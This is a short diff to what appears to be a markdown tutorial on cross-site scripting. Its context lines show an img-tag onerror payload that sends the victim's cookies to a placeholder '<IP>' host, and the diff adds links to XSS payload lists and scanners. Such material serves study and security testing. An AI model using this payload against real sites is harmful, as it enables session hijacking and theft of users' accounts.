@@ -29,3 +29,9 @@ Suppose we have a vulnerable web application that reflects user input without pr
 ```html
 <img src=x onerror="document.location='http://<IP>/?c='+document.cookie;">
 ```
+
+## Links
+
+- https://github.com/payloadbox/xss-payload-list
+- https://github.com/s0md3v/XSStrike
+- https://github.com/hahwul/dalfox
